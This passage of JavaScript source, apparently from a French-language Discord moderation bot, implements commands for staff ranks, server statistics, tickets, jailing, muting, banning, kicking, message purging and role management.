        const staff = getStaffRoles(message.guild.id);
        staff.mods.add(targetMember.id);
        saveBotData();
        return message.reply(`✅ **${targetMember.user.tag}** défini comme Modo bot.`);
    }

    if (command === 'unmod') {
        if (!requireRank(2)) return;
        const targetMember = await fetchTargetMember(message, targetArg);
        if (!targetMember) return message.reply("Utilisation : `=unmod <@membre|ID>`");
        const targetRank = getUserRankLevel(message, targetMember.id);
        if (targetRank >= authorRank) return message.reply(NO_PERM_MSG);
        const staff = getStaffRoles(message.guild.id);
        staff.mods.delete(targetMember.id);
        saveBotData();
        return message.reply(`✅ **${targetMember.user.tag}** retiré des Modos bot.`);
    }

    if (command === 'owners') {
        const ownerList = Array.from(botOwners).map(id => `┗ ID : \`${id}\``).join('\n');
        return message.reply({ embeds: [new EmbedBuilder().setColor('#2b2d31').setTitle('👑 Owners').setDescription(ownerList)] });
    }
    if (command === 'stats') {
        const guild = message.guild;
        await guild.members.fetch();
        const totalMembers = guild.memberCount;
        const onlineMembers = guild.members.cache.filter(m => m.presence && m.presence.status !== 'offline').size;
        const voiceMembersCount = guild.members.cache.filter(m => m.voice && m.voice.channelId).size;
        const botCount = guild.members.cache.filter(m => m.user.bot).size;
        const humanCount = totalMembers - botCount;
        const boostCount = guild.premiumSubscriptionCount || 0;
        const boostTier = guild.premiumTier;

        const statsEmbed = new EmbedBuilder()
            .setColor('#2b2d31')
            .setTitle(`📊 Statistiques du serveur : ${guild.name}`)
            .setThumbnail(guild.iconURL({ dynamic: true }))
            .addFields(
                { name: '👥 Membres', value: `Total : \`${totalMembers}\`\nHumains : \`${humanCount}\`\nBots : \`${botCount}\``, inline: true },
                { name: '🟢 Activité', value: `En ligne : \`${onlineMembers}\`\nEn vocal : \`${voiceMembersCount}\``, inline: true },
                { name: '🚀 Boosts', value: `Niveau : \`${boostTier}\`\nBoosts : \`${boostCount}\``, inline: true },
                { name: '👑 Propriétaire', value: `<@${guild.ownerId}>`, inline: true },
                { name: '📅 Création', value: `<t:${Math.floor(guild.createdTimestamp / 1000)}:R>`, inline: true }
            )
            .setTimestamp();

        return message.reply({ embeds: [statsEmbed] });
    }

    if (command === 'userinfo') {
        const targetMember = await fetchTargetMember(message, targetArg) || message.member;
        const user = targetMember.user;
        const roles = targetMember.roles.cache
            .filter(r => r.id !== message.guild.id)
            .sort((a, b) => b.position - a.position)
            .map(r => `<@&${r.id}>`)
            .slice(0, 10)
            .join(', ') || 'Aucun rôle';

        const infoEmbed = new EmbedBuilder()
            .setColor(targetMember.displayHexColor !== '#000000' ? targetMember.displayHexColor : '#2b2d31')
            .setTitle(`👤 Informations : ${user.tag}`)
            .setThumbnail(user.displayAvatarURL({ dynamic: true, size: 512 }))
            .addFields(
                { name: '🆔 ID', value: `\`${user.id}\``, inline: true },
                { name: '📆 Création du compte', value: `<t:${Math.floor(user.createdTimestamp / 1000)}:R>`, inline: true },
                { name: '📥 Arrivée sur le serveur', value: `<t:${Math.floor(targetMember.joinedTimestamp / 1000)}:R>`, inline: true },
                { name: `🏷️ Rôles (${targetMember.roles.cache.size - 1})`, value: roles }
            )
            .setTimestamp();

        return message.reply({ embeds: [infoEmbed] });
    }

    if (command === 'avatar') {
        const targetUser = await fetchTargetUser(client, message.guild, targetArg) || message.author;
        const avatarEmbed = new EmbedBuilder()
            .setColor('#2b2d31')
            .setTitle(`🖼️ Avatar de ${targetUser.username}`)
            .setImage(targetUser.displayAvatarURL({ dynamic: true, size: 1024 }));
        return message.reply({ embeds: [avatarEmbed] });
    }

    if (command === 'ping') {
        const sent = await message.reply('🏓 Calcul de la latence...');
        const latency = sent.createdTimestamp - message.createdTimestamp;
        return sent.edit(`🏓 **Pong !**\nLatence Bot : \`${latency}ms\`\nLatence API Discord : \`${Math.round(client.ws.ping)}ms\``);
    }

    if (command === 'ticketsetup') {
        if (!requireRank(3)) return;
        return message.reply({ embeds: [getTicketDashboardEmbed(message.guild, config)], components: getTicketDashboardRows() });
    }

    if (command === 'ticketadd') {
        if (!requireRank(3)) return;
        const name = args[0];
        const emoji = args[1] || '🎫';
        if (!name) return message.reply("Utilisation : `=ticketadd <Nom> <Emoji>`");
        
        const tConfig = config.ticketConfig;
        const newId = `ticket_${name.toLowerCase()}`;
        if (tConfig.categories.some(c => c.id === newId)) return message.reply("❌ Cette catégorie existe déjà.");
        
        tConfig.categories.push({ id: newId, name: name, emoji: emoji, categoryId: null, roleId: null, description: `Ouvrir un ticket ${name}` });
        saveBotData();
        return message.reply(`✅ Type de ticket **${name}** (${emoji}) ajouté ! Ouvre \`=ticketsetup\` pour voir les changements.`);
    }

    if (command === 'ticketremove') {
        if (!requireRank(3)) return;
        const typeName = args[0]?.toLowerCase();
        if (!typeName) return message.reply("Utilisation : `=ticketremove <Nom>`");
        const tConfig = config.ticketConfig;
        const initialLen = tConfig.categories.length;
        tConfig.categories = tConfig.categories.filter(c => c.name.toLowerCase() !== typeName && c.id !== `ticket_${typeName}`);
        if (tConfig.categories.length === initialLen) return message.reply("❌ Type de ticket introuvable.");
        saveBotData();
        return message.reply(`✅ Type de ticket **${typeName}** supprimé !`);
    }

    if (command === 'setticketpanel') {
        if (!requireRank(3)) return;
        const channel = message.mentions.channels.first();
        if (!channel) return message.reply("Utilisation : `=setticketpanel <#salon>`");
        config.ticketConfig.panelChannel = channel.id;
        saveBotData();
        return message.reply(`✅ Salon du panneau défini sur ${channel} !`);
    }

    if (command === 'setticketcat') {
        if (!requireRank(3)) return;
        const catId = args[0];
        if (!catId) return message.reply("Utilisation : `=setticketcat <ID_Catégorie>`");
        config.ticketConfig.categoryDestination = catId;
        saveBotData();
        return message.reply(`✅ Catégorie globale par défaut définie : \`${catId}\``);
    }

    if (command === 'setticketcatid') {
        if (!requireRank(3)) return;
        const catId = args[0];
        const ticketName = args.slice(1).join(' ').toLowerCase();
        if (!catId || !ticketName) return message.reply("Utilisation : `=setticketcatid <ID_Catégorie> <Nom_Du_Ticket>`");
        
        const tConfig = config.ticketConfig;
        const ticketCat = tConfig.categories.find(c => c.name.toLowerCase() === ticketName || c.id === `ticket_${ticketName}`);
        if (!ticketCat) return message.reply(`❌ Aucun type de ticket trouvé avec le nom \`${ticketName}\`.`);
        
        ticketCat.categoryId = catId;
        saveBotData();
        return message.reply(`✅ Le type de ticket **${ticketCat.name}** s'ouvrira désormais dans la catégorie ID : \`${catId}\``);
    }

    if (command === 'setticketrole') {
        if (!requireRank(3)) return;
        const role = await fetchTargetRole(message, args[0]);
        const ticketName = args.slice(1).join(' ').toLowerCase();
        if (!role || !ticketName) return message.reply("Utilisation : `=setticketrole <@rôle|ID> <Nom_Du_Ticket>`");

        const tConfig = config.ticketConfig;
        const ticketCat = tConfig.categories.find(c => c.name.toLowerCase() === ticketName || c.id === `ticket_${ticketName}`);
        if (!ticketCat) return message.reply(`❌ Aucun type de ticket trouvé avec le nom \`${ticketName}\`.`);

        ticketCat.roleId = role.id;
        saveBotData();
        return message.reply(`✅ Le rôle **${role.name}** aura désormais accès et sera ping à chaque ouverture de ticket **${ticketCat.name}** !`);
    }

    if (command === 'setticketlog') {
        if (!requireRank(3)) return;
        const channel = message.mentions.channels.first();
        if (!channel) return message.reply("Utilisation : `=setticketlog <#salon>`");
        config.ticketConfig.logChannel = channel.id;
        saveBotData();
        return message.reply(`✅ Salon logs / transcripts défini sur ${channel} !`);
    }

    if (command === 'settickettitle') {
        if (!requireRank(3)) return;
        const newTitle = args.join(' ');
        if (!newTitle) return message.reply("Utilisation : `=settickettitle <Titre>`");
        config.ticketConfig.title = newTitle;
        saveBotData();
        return message.reply(`✅ Titre mis à jour : **${newTitle}**`);
    }

    if (command === 'setticketdesc') {
        if (!requireRank(3)) return;
        const newDesc = args.join(' ');
        if (!newDesc) return message.reply("Utilisation : `=setticketdesc <Description>`");
        config.ticketConfig.description = newDesc;
        saveBotData();
        return message.reply("✅ Description mise à jour.");
    }

    if (command === 'setticketimage') {
        if (!requireRank(3)) return;
        const url = args[0];
        if (!url) return message.reply("Utilisation : `=setticketimage <url|none>`");
        config.ticketConfig.imageUrl = (url.toLowerCase() === 'none') ? null : url;
        saveBotData();
        return message.reply("✅ Image / GIF du panneau mis à jour.");
    }

    if (command === 'closeticket') {
        if (!requireRank(1)) return;
        const channel = message.channel;
        if (!channel.name.includes('-')) return message.reply("❌ Cette commande s'utilise uniquement dans un salon de ticket.");
        await message.reply("🔒 Fermeture du ticket en cours...");
        setTimeout(() => channel.delete().catch(() => {}), 2000);
        return;
    }
    if (command === 'jail') {
        if (!requireRank(2)) return;
        const targetMember = await fetchTargetMember(message, targetArg);
        const reason = args.slice(1).join(' ') || "Aucune raison";
        if (!targetMember) return message.reply("❌ Mentionne un membre.");
        if (getUserRankLevel(message, targetMember.id) >= authorRank) return message.reply(NO_PERM_MSG);
        try {
            const botRolePos = message.guild.members.me.roles.highest.position;
            const roleIds = targetMember.roles.cache.filter(r => r.id !== message.guild.id && !r.managed && r.position < botRolePos).map(r => r.id);
            jailDataMap.set(targetMember.id, roleIds);
            saveBotData();
            if (roleIds.length > 0) await targetMember.roles.remove(roleIds).catch(() => {});

            const jailChan = await message.guild.channels.create({
                name: `jail-${targetMember.user.username}`,
                type: ChannelType.GuildText,
                permissionOverwrites: [
                    { id: message.guild.roles.everyone.id, deny: [PermissionsBitField.Flags.ViewChannel] },
                    { id: targetMember.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] }
                ]
            });
            await jailChan.send({ content: `<@${targetMember.id}>`, embeds: [new EmbedBuilder().setTitle('🔒 PRISON').setDescription(`Raison : ${reason}`)] });
            return message.reply(`🔒 Membre en prison : ${jailChan}`);
        } catch (e) { return message.reply("❌ Erreur."); }
    }

    if (command === 'unjail') {
        if (!requireRank(2)) return;
        const targetMember = await fetchTargetMember(message, targetArg);
        if (!targetMember) return message.reply("❌ Mentionne un membre.");
        try {
            const savedRoles = jailDataMap.get(targetMember.id);
            if (savedRoles && savedRoles.length > 0) {
                await targetMember.roles.add(savedRoles).catch(() => {});
                jailDataMap.delete(targetMember.id);
                saveBotData();
            }
            const jailChan = message.guild.channels.cache.find(c => c.name === `jail-${targetMember.user.username.toLowerCase()}`);
            if (jailChan) await jailChan.delete().catch(() => {});
            return message.reply(`🔓 **${targetMember.user.tag}** libéré.`);
        } catch (e) { return message.reply("❌ Erreur."); }
    }

    if (command === 'lock') {
        if (!requireRank(1)) return;
        await message.channel.permissionOverwrites.edit(message.guild.roles.everyone, { SendMessages: false });
        return message.reply("🔒 Salon verrouillé.");
    }

    if (command === 'unlock') {
        if (!requireRank(1)) return;
        await message.channel.permissionOverwrites.edit(message.guild.roles.everyone, { SendMessages: null });
        return message.reply("🔓 Salon déverrouillé.");
    }

    if (command === 'hide') {
        if (!requireRank(1)) return;
        await message.channel.permissionOverwrites.edit(message.guild.roles.everyone, { ViewChannel: false });
        return message.reply("🙈 Salon caché pour tout le monde.");
    }

    if (command === 'unhide') {
        if (!requireRank(1)) return;
        await message.channel.permissionOverwrites.edit(message.guild.roles.everyone, { ViewChannel: null });
        return message.reply("🐵 Salon visible à nouveau.");
    }

    if (command === 'mute') {
        if (!requireRank(1)) return;
        const targetMember = await fetchTargetMember(message, targetArg);
        const durationStr = args[1];
        const reason = args.slice(2).join(' ') || "Aucune raison";
        if (!targetMember || !durationStr) return message.reply("Utilisation : `=mute <@membre> <durée> [raison]`");
        if (getUserRankLevel(message, targetMember.id) >= authorRank) return message.reply(NO_PERM_MSG);
        const ms = parseDuration(durationStr);
        if (!ms) return message.reply("❌ Durée invalide.");
        await targetMember.timeout(ms, reason);
        return message.reply(`🔇 **${targetMember.user.tag}** mute.`);
    }

    if (command === 'warn') {
        if (!requireRank(1)) return;
        const targetMember = await fetchTargetMember(message, targetArg);
        if (!targetMember) return message.reply("❌ Mentionne un membre.");
        if (getUserRankLevel(message, targetMember.id) >= authorRank) return message.reply(NO_PERM_MSG);
        const reason = args.slice(1).join(' ') || "Aucune raison";
        let userWarns = warningsMap.get(targetMember.id) || [];
        userWarns.push({ reason, moderator: message.author.tag });
        warningsMap.set(targetMember.id, userWarns);
        saveBotData();
        return message.reply(`⚠️ Warn enregistré (${userWarns.length}).`);
    }

    if (command === 'setlog') {
        if (!requireRank(3)) return;
        const channel = message.mentions.channels.first() || message.channel;
        config.logChannel = channel.id;
        saveBotData();
        return message.reply(`✅ Salon de logs défini sur ${channel} !`);
    }

    if (command === 'setwelcome') {
        if (!requireRank(3)) return;
        const channel = message.mentions.channels.first();
        const welcomeText = args.slice(1).join(' ');
        if (!channel || !welcomeText) return message.reply("Utilisation : `=setwelcome <#salon> <message>`");
        config.welcomeChannel = channel.id;
        config.welcomeText = welcomeText;
        saveBotData();
        return message.reply(`✅ Salon de bienvenue configuré !`);
    }

    if (command === 'gcreate') {
        if (!requireRank(2)) return;
        const duration = args[0], winnersCount = parseInt(args[1]), prize = args.slice(2).join(' ');
        if (!duration || isNaN(winnersCount) || !prize) return message.reply("Utilisation : `=gcreate <durée> <gagnants> <prix>`");
        const embed = new EmbedBuilder().setColor('#2b2d31').setTitle("🎉 GIVEAWAY 🎉").setDescription(`**Lot :** ${prize}\n**Gagnants :** ${winnersCount}`);
        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('join_giveaway').setLabel('🎉 Participer').setStyle(ButtonStyle.Success));
        await message.channel.send({ embeds: [embed], components: [row] });
        return message.reply("🎉 Giveaway lancé !");
    }

    if (command === 'bl') {
        if (!requireRank(2)) return;
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("ID ou mention invalide.");
        if (getUserRankLevel(message, targetUser.id) >= authorRank) return message.reply(NO_PERM_MSG);
        await message.guild.members.ban(targetUser.id);
        return message.reply(`🔨 **${targetUser.tag}** banni.`);
    }

    else if (command === 'softbl') {
        if (!requireRank(2)) return;
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("ID invalide.");
        if (getUserRankLevel(message, targetUser.id) >= authorRank) return message.reply(NO_PERM_MSG);
        await message.guild.members.ban(targetUser.id, { deleteMessageSeconds: 604800 });
        await message.guild.members.unban(targetUser.id);
        return message.reply(`🌪️ Softban effectué.`);
    }

    else if (command === 'unbl') {
        if (!requireRank(2)) return;
        const userId = targetArg?.replace(/<@!?|>/g, '');
        if (!userId) return message.reply("ID requis.");
        await message.guild.members.unban(userId);
        return message.reply(`🔓 Débanni.`);
    }

    else if (command === 'blist') {
        if (!requireRank(2)) return;
        const bans = await message.guild.bans.fetch();
        const banList = bans.map(b => `• **${b.user.tag}**`).slice(0, 15).join('\n') || "Aucun.";
        return message.reply({ embeds: [new EmbedBuilder().setTitle("🔨 Bannissements").setDescription(banList)] });
    }

    else if (command === 'unbanall') {
        if (!requireRank(3)) return;
        const bans = await message.guild.bans.fetch();
        for (const [id] of bans) await message.guild.members.unban(id).catch(() => {});
        return message.reply(`🔓 Tous débannis (${bans.size}).`);
    }

    else if (command === 'kick') {
        if (!requireRank(2)) return;
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Membre introuvable.");
        if (getUserRankLevel(message, targetUser.id) >= authorRank) return message.reply(NO_PERM_MSG);
        const member = await message.guild.members.fetch(targetUser.id).catch(() => null);
        if (!member) return message.reply("Membre introuvable.");
        await member.kick();
        return message.reply(`✅ Expulsé.`);
    }
    else if (command === 'clear') {
        if (!requireRank(1)) return;
        const count = parseInt(args[0]);
        if (isNaN(count) || count < 1 || count > 50) return message.reply("❌ Entre 1 et 50.");
        await message.delete().catch(() => {});
        const fetched = await message.channel.messages.fetch({ limit: count });
        await message.channel.bulkDelete(fetched, true);
        return;
    }

    else if (command === 'purge') {
        if (!requireRank(1)) return;
        const targetUser = await fetchTargetMember(message, targetArg);
        if (!targetUser) return message.reply("Membre introuvable.");
        const fetched = await message.channel.messages.fetch({ limit: 100 });
        const userMsgs = fetched.filter(m => m.author.id === targetUser.id).first(30);
        await message.channel.bulkDelete(userMsgs, true);
        return;
    }

    else if (command === 'snipe') {
        const sniped = snipeCache.get(message.channel.id);
        if (!sniped) return message.reply("❌ Aucun message.");
        return message.reply({ embeds: [new EmbedBuilder().setAuthor({ name: sniped.author }).setDescription(sniped.content)] });
    }

    else if (command === 'slowmode') {
        if (!requireRank(1)) return;
        const sec = parseInt(args[0]);
        if (isNaN(sec) || sec < 0) return message.reply("❌ Durée invalide.");
        await message.channel.setRateLimitPerUser(sec);
        return message.reply(`⏱️ Mode lent : ${sec}s.`);
    }

    else if (command === 'renew') {
        if (!requireRank(2)) return;
        const newChan = await message.channel.clone();
        await message.channel.delete();
        newChan.send("🔄 Salon régénéré !");
    }

    else if (command === 'createtext') {
        if (!requireRank(2)) return;
        const chanName = args.join('-');
        if (!chanName) return message.reply("Utilisation : `=createtext <nom>`");
        await message.guild.channels.create({ name: chanName, type: ChannelType.GuildText });
        return message.reply("✅ Salon texte créé.");
    }

    else if (command === 'createvoice') {
        if (!requireRank(2)) return;
        const chanName = args.join(' ');
        if (!chanName) return message.reply("Utilisation : `=createvoice <nom>`");
        await message.guild.channels.create({ name: chanName, type: ChannelType.GuildVoice });
        return message.reply("✅ Salon vocal créé.");
    }
    else if (command === 'addrole') {
        if (!requireRank(2)) return;
        const member = await fetchTargetMember(message, targetArg);
        const role = await fetchTargetRole(message, args[1]);
        if (!member || !role) return message.reply("Utilisation : `=addrole <@membre> <@rôle|ID>`");
        
        if (!isSuperOwner(message)) {
            const authorHighest = message.member.roles.highest.position;
            const botHighest = message.guild.members.me.roles.highest.position;

            if (role.position >= authorHighest) {
                return message.reply("❌ Tu ne peux pas attribuer un rôle supérieur ou égal à ton propre rôle le plus haut.");
            }
            if (role.position >= botHighest) {
                return message.reply("❌ Je ne peux pas attribuer ce rôle car il est supérieur ou égal au mien.");
            }
        }

        try {
            await member.roles.add(role);
            return message.reply(`✅ Rôle ${role.name} ajouté à ${member.user.tag}.`);
        } catch (e) {
            return message.reply("❌ Erreur lors de l'ajout du rôle (Vérifie mes permissions).");
        }
    }
    else if (command === 'delrole') {
        if (!requireRank(2)) return;
        const member = await fetchTargetMember(message, targetArg);
        const role = await fetchTargetRole(message, args[1]);
        if (!member || !role) return message.reply("Utilisation : `=delrole <@membre> <@rôle|ID>`");

        if (!isSuperOwner(message)) {
            const authorHighest = message.member.roles.highest.position;
            const botHighest = message.guild.members.me.roles.highest.position;

            if (role.position >= authorHighest) {
                return message.reply("❌ Tu ne peux pas retirer un rôle supérieur ou égal à ton propre rôle le plus haut.");
            }
            if (role.position >= botHighest) {
                return message.reply("❌ Je ne peux pas retirer ce rôle car il est supérieur ou égal au mien.");
            }
        }

        try {
            await member.roles.remove(role);
            return message.reply(`✅ Rôle ${role.name} retiré à ${member.user.tag}.`);
        } catch (e) {
            return message.reply("❌ Erreur lors du retrait du rôle (Vérifie mes permissions).");
        }
    }
});

client.login(process.env.DISCORD_TOKEN);
